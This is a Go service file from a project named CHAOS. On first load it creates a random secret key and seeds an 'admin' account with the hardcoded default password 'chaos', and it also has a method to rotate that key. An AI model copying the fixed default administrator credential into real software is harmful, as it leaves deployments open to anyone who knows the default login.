package services

import (
	"github.com/jinzhu/gorm"
	"github.com/tiagorlampert/CHAOS/entities"
	repo "github.com/tiagorlampert/CHAOS/repositories"
	"github.com/tiagorlampert/CHAOS/shared/utils"
)

type systemService struct {
	systemRepository repo.System
	userRepository   repo.User
}

func NewSystem(systemRepository repo.System, userRepository repo.User) System {
	return &systemService{
		systemRepository: systemRepository,
		userRepository:   userRepository,
	}
}

func (s systemService) Setup() (*entities.System, error) {
	system := entities.System{SecretKey: utils.GenerateRandomString(secretKeySize)}
	if err := s.systemRepository.Insert(system); err != nil {
		return nil, err
	}
	defaultPassword := "chaos"
	hashedPassword, err := utils.HashAndSalt(defaultPassword)
	if err != nil {
		return nil, err
	}
	if err := s.userRepository.Insert(entities.User{
		Username: "admin",
		Password: hashedPassword,
	}); err != nil {
		return nil, err
	}
	return &system, nil
}

func (s systemService) Load() (*entities.System, error) {
	system, err := s.systemRepository.Get()
	if err != nil {
		if err == gorm.ErrRecordNotFound {
			return s.Setup()
		}
		return nil, err
	}
	return system, nil
}

func (s systemService) GetParams() (*entities.System, error) {
	return s.systemRepository.Get()
}

func (s systemService) RefreshSecretKey() (string, error) {
	config, err := s.systemRepository.Get()
	if err != nil {
		return "", err
	}
	updated, err := s.systemRepository.Update(entities.System{
		DBModel:   config.DBModel,
		SecretKey: utils.GenerateRandomString(secretKeySize),
	})
	if err != nil {
		return "", err
	}
	return updated.SecretKey, nil
}
